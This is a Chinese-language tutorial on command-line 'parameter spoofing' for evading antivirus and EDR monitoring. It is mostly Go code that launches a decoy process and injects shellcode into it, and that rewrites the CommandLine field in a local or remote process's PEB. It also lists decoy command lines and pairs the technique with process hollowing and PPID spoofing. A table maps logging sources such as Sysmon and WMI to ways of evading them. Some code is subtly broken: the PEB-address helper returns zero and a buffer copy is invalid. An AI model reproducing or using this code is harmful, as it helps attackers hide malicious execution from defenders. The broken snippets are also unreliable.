# 参数欺骗（Parameter Spoofing）

## 原理

参数欺骗是一种通过伪造进程启动参数来规避检测的技术。杀软和EDR通常会检查进程的命令行参数来判断恶意行为。参数欺骗通过创建进程时使用合法参数，但在执行前或执行后修改真实参数，使监控系统记录的参数与实际执行内容不一致。

**核心思想：**
- 用合法参数创建进程（欺骗监控）
- 运行时修改真实的执行参数
- 监控系统看到的参数与实际不符

**两种实现方式：**
1. **CreateProcess参数欺骗**：创建进程时使用合法命令行，执行恶意内容
2. **PEB参数欺骗**：运行时修改PEB中的CommandLine字段

---

## 方式1：CreateProcess参数欺骗

### 原理

创建目标进程时，传入合法的命令行参数（如`notepad.exe C:\test.txt`），但实际执行恶意代码。监控系统只看到合法参数。

### API调用流程

| 步骤 | API | 说明 |
|------|-----|------|
| 1 | CreateProcess | 使用合法命令行参数创建进程 |
| 2 | VirtualAllocEx | 在目标进程分配内存 |
| 3 | WriteProcessMemory | 写入恶意Shellcode |
| 4 | CreateRemoteThread | 创建线程执行Shellcode |
| 5 | TerminateProcess | 结束原始进程主线程（可选） |

### Go实现

```go
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

func createProcessWithSpoofedParams(fakeCmdLine string, sc []byte) {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")

    // 动态获取API
    CreateProcessW := kernel32.NewProc("CreateProcessW")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
    CloseHandle := kernel32.NewProc("CloseHandle")

    // 1. 构造合法的命令行参数（欺骗监控）
    // 例如："C:\\Windows\\System32\\notepad.exe C:\\config.txt"
    fakeCmdLinePtr, _ := windows.UTF16PtrFromString(fakeCmdLine)

    var si windows.StartupInfo
    var pi windows.ProcessInformation
    si.Size = uint32(unsafe.Sizeof(si))

    // 2. 使用合法参数创建进程
    // 监控系统会记录这个合法的命令行
    ret, _, _ := CreateProcessW.Call(
        0,                              // 应用程序名（NULL）
        uintptr(unsafe.Pointer(fakeCmdLinePtr)), // 命令行（欺骗参数）
        0,                              // 进程安全属性
        0,                              // 线程安全属性
        0,                              // 不继承句柄
        0x4,                            // CREATE_SUSPENDED（挂起创建）
        0,                              // 环境
        0,                              // 当前目录
        uintptr(unsafe.Pointer(&si)),   // 启动信息
        uintptr(unsafe.Pointer(&pi)),   // 进程信息
    )
    if ret == 0 {
        return
    }

    // 3. 在目标进程分配内存
    remoteAddr, _, _ := VirtualAllocEx.Call(
        uintptr(pi.Process),
        0,
        uintptr(len(sc)),
        0x1000|0x2000,  // MEM_COMMIT | MEM_RESERVE
        0x40,           // PAGE_EXECUTE_READWRITE
    )

    // 4. 写入Shellcode（实际恶意内容）
    var bytesWritten uintptr
    WriteProcessMemory.Call(
        uintptr(pi.Process),
        remoteAddr,
        uintptr(unsafe.Pointer(&sc[0])),
        uintptr(len(sc)),
        uintptr(unsafe.Pointer(&bytesWritten)),
    )

    // 5. 创建远程线程执行Shellcode
    // 实际执行恶意代码，但监控记录的是合法参数
    CreateRemoteThread.Call(
        uintptr(pi.Process),
        0,
        0,
        remoteAddr,
        0,
        0,
        0,
    )

    // 6. 清理
    CloseHandle.Call(uintptr(pi.Process))
    CloseHandle.Call(uintptr(pi.Thread))
}

// 使用示例
func main() {
    shellcode := []byte{...}

    // 欺骗参数：看起来像打开配置文件
    fakeParams := "C:\\Windows\\System32\\notepad.exe C:\\Windows\\config.ini"

    createProcessWithSpoofedParams(fakeParams, shellcode)
}
```

---

## 方式2：PEB参数欺骗

### 厯理

进程的命令行参数存储在PEB（Process Environment Block）结构中。通过直接修改PEB中的CommandLine字段，可以在进程运行时改变其记录的命令行参数，使监控系统获取到伪造的参数。

### PEB结构

```
PEB结构：
├── ProcessParameters (RTL_USER_PROCESS_PARAMETERS)
│   ├── CommandLine (UNICODE_STRING)
│   │   ├── Buffer    ← 命令行字符串指针
│   │   ├── Length    ← 字符串长度
│   │   └── MaximumLength
│   ├── ImagePathName
│   ├── Environment
│   └── ...
```

### Go实现（修改自身PEB）

```go
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

// UNICODE_STRING结构
type UNICODE_STRING struct {
    Length        uint16
    MaximumLength uint16
    Buffer        uintptr
}

// RTL_USER_PROCESS_PARAMETERS结构
type RTL_USER_PROCESS_PARAMETERS struct {
    MaximumLength    uint32
    Length           uint32
    Flags            uint32
    DebugFlags       uint32
    ConsoleHandle    uintptr
    ConsoleFlags     uint32
    StandardInput    uintptr
    StandardOutput   uintptr
    StandardError    uintptr
    CurrentDirectory UNICODE_STRING
    DllPath          UNICODE_STRING
    ImagePathName    UNICODE_STRING
    CommandLine      UNICODE_STRING  // ← 目标字段
    // ... 其他字段
}

// 获取PEB地址
func getPEBAddress() uintptr {
    // x64: GS:[0x60] 存储PEB地址
    // Go中使用汇编或syscall获取
    var peb uintptr
    // 通过NtQueryInformationProcess获取
    return peb
}

// 修改PEB中的CommandLine
func spoofPEBCommandLine(fakeCmdLine string) error {
    // 1. 获取PEB地址
    peb := getPEBAddress()

    // 2. 计算ProcessParameters偏移
    // PEB结构中ProcessParameters在偏移0x20 (x64)
    processParamsAddr := *(*uintptr)(unsafe.Pointer(peb + 0x20))

    // 3. 计算CommandLine偏移
    // RTL_USER_PROCESS_PARAMETERS中CommandLine偏移约0x70
    commandLineAddr := processParamsAddr + 0x70

    // 4. 构造伪造的命令行
    fakeCmdLinePtr, _ := windows.UTF16PtrFromString(fakeCmdLine)
    fakeCmdLineLen := uint16(len(fakeCmdLine) * 2) // UTF16每字符2字节

    // 5. 分配新的命令行缓冲区
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    newBuffer, _, _ := VirtualAlloc.Call(
        0,
        uintptr(fakeCmdLineLen + 2),
        0x1000|0x2000,
        0x40,  // PAGE_EXECUTE_READWRITE
    )

    // 6. 复制伪造命令行到新缓冲区
    copy((*[]uint16)(unsafe.Pointer(newBuffer))[:len(fakeCmdLine)+1],
         (*[]uint16)(unsafe.Pointer(fakeCmdLinePtr))[:len(fakeCmdLine)+1])

    // 7. 修改UNICODE_STRING结构
    cmdLineStruct := (*UNICODE_STRING)(unsafe.Pointer(commandLineAddr))
    cmdLineStruct.Buffer = newBuffer
    cmdLineStruct.Length = fakeCmdLineLen
    cmdLineStruct.MaximumLength = fakeCmdLineLen + 2

    return nil
}
```

---

## 方式3：远程进程PEB欺骗

### 原理

修改目标进程的PEB中的CommandLine字段，使监控系统查询目标进程时获取到伪造的参数。

### Go实现

```go
package main

import (
    "golang.org/x/sys/windows"
    "unsafe"
)

func spoofRemoteProcessPEB(pid uint32, fakeCmdLine string) error {
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    ntdll := windows.NewLazySystemDLL("ntdll.dll")

    OpenProcess := kernel32.NewProc("OpenProcess")
    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
    ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")
    NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
    CloseHandle := kernel32.NewProc("CloseHandle")

    // 1. 打开目标进程
    process, _, _ := OpenProcess.Call(
        0x1F0FFF,  // PROCESS_ALL_ACCESS
        0,
        uintptr(pid),
    )

    // 2. 获取目标进程PEB地址
    // PROCESS_BASIC_INFORMATION结构
    type PROCESS_BASIC_INFORMATION struct {
        ExitStatus       uintptr
        PebBaseAddress   uintptr  // ← PEB地址
        AffinityMask     uintptr
        BasePriority     uintptr
        UniqueProcessId  uintptr
        InheritedFromUniqueProcessId uintptr
    }

    var pbi PROCESS_BASIC_INFORMATION
    var returnLength uintptr
    NtQueryInformationProcess.Call(
        process,
        0,  // ProcessBasicInformation
        uintptr(unsafe.Pointer(&pbi)),
        uintptr(unsafe.Sizeof(pbi)),
        uintptr(unsafe.Pointer(&returnLength)),
    )

    // 3. 读取目标进程PEB中的ProcessParameters指针
    // PEB偏移0x20处是ProcessParameters指针
    var processParamsPtr uintptr
    ReadProcessMemory.Call(
        process,
        pbi.PebBaseAddress + 0x20,
        uintptr(unsafe.Pointer(&processParamsPtr)),
        uintptr(unsafe.Sizeof(processParamsPtr)),
        0,
    )

    // 4. 在目标进程分配新命令行缓冲区
    fakeCmdLineUTF16, _ := windows.UTF16FromString(fakeCmdLine)
    newBuffer, _, _ := VirtualAllocEx.Call(
        process,
        0,
        uintptr(len(fakeCmdLineUTF16)*2),
        0x1000|0x2000,
        0x40,
    )

    // 5. 写入伪造命令行
    WriteProcessMemory.Call(
        process,
        newBuffer,
        uintptr(unsafe.Pointer(&fakeCmdLineUTF16[0])),
        uintptr(len(fakeCmdLineUTF16)*2),
        0,
    )

    // 6. 修改目标进程的CommandLine UNICODE_STRING
    // CommandLine在ProcessParameters偏移0x70处
    // UNICODE_STRING结构：Length(2), MaximumLength(2), Buffer(8)

    var uniStr UNICODE_STRING
    uniStr.Length = uint16((len(fakeCmdLineUTF16) - 1) * 2)
    uniStr.MaximumLength = uint16(len(fakeCmdLineUTF16) * 2)
    uniStr.Buffer = newBuffer

    WriteProcessMemory.Call(
        process,
        processParamsPtr + 0x70,  // CommandLine偏移
        uintptr(unsafe.Pointer(&uniStr)),
        uintptr(unsafe.Sizeof(uniStr)),
        0,
    )

    CloseHandle.Call(process)
    return nil
}
```

---

## 常用欺骗参数模板

| 目标进程 | 欺骗参数示例 | 说明 |
|----------|--------------|------|
| notepad.exe | `notepad.exe C:\Windows\config.ini` | 伪装打开配置文件 |
| svchost.exe | `svchost.exe -k netsvcs` | 伪装系统服务 |
| cmd.exe | `cmd.exe /c dir C:\` | 伪装命令行操作 |
| powershell.exe | `powershell.exe -ExecutionPolicy Bypass -File C:\scripts\update.ps1` | 伪装脚本执行 |
| explorer.exe | `explorer.exe C:\Users\Public\Documents` | 伪装文件夹操作 |
| rundll32.exe | `rundll32.exe shell32.dll,Control_RunDLL` | 伪装DLL调用 |

---

## 与其他技术结合

### 1. 参数欺骗 + 进程镂空

```go
func processHollowingWithSpoofedParams(targetExe, fakeParams string, sc []byte) {
    // 创建进程使用欺骗参数
    CreateProcessW.Call(..., fakeParams, CREATE_SUSPENDED, ...)

    // 执行进程镂空
    // 1. 获取线程上下文
    // 2. 卸载主模块
    // 3. 写入Shellcode
    // 4. 修改入口点
    // 5. 恢复执行

    // 监控记录：合法参数
    // 实际执行：恶意Shellcode
}
```

### 2. 参数欺骗 + PPID欺骗

```go
func createProcessWithSpoofedPPIDAndParams(parentPid uint32, fakeParams string, sc []byte) {
    // PPID欺骗：伪装父进程
    // 参数欺骗：伪装命令行
    // 双重欺骗增强隐蔽性
}
```

### 3. 参数欺骗 + BlockDLLs

```go
func createProcessSpoofedBlockDLLs(fakeParams string, sc []byte) {
    // 参数欺骗 + BlockDLLs
    // 阻止非微软DLL注入
    // 进一步保护恶意进程
}
```

---

## 检测规避要点

| 检测点 | 规避方法 |
|--------|----------|
| 命令行日志 | 使用合法参数欺骗 |
| 进程行为分析 | 实际执行与参数不一致 |
| WMI事件监控 | 伪造参数记录到WMI |
| Sysmon日志 | 欺骗参数被记录 |

---

## 注意事项

1. **参数真实性**：欺骗参数应与目标进程匹配，避免异常
2. **PEB偏移**：不同Windows版本PEB结构可能有变化
3. **权限要求**：修改远程进程PEB需要PROCESS_VM_WRITE权限
4. **时机选择**：PEB欺骗应在进程创建后尽快执行
5. **清理痕迹**：执行完成后恢复原始参数（可选）
6. **Unicode处理**：PEB中命令行使用UTF16编码